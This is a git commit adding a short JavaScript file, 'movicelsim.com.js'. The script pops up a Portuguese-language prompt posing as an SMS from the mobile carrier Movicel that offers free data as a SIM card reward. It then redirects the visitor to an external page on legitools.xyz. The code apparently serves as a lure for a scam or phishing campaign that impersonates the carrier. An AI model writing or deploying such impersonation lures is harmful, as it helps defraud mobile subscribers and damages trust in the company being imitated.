219dccb37a68a2123fa511889615aeb2e4b1b01a
harryjohnson86 <mfonjohnson86@gmail.com>
2025-02-08 21:28:40 -0800

    Create movicelsim.com.js

---
+++ movicelsim.com.js
@@ -0,0 +1,5 @@
+var password = 'Dados Gratuitos da Movicel'
+password=prompt('SMS: Temporada de amor Seu número é elegível para receber dados gratuitos RECOMPENSA DE CARTÃO SIM ANTIGO, por favor pressione OK para ATIVAR. ','Dados Gratuitos da Movicel');
+if (password != 'Dados Gratuitos da Movicel') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
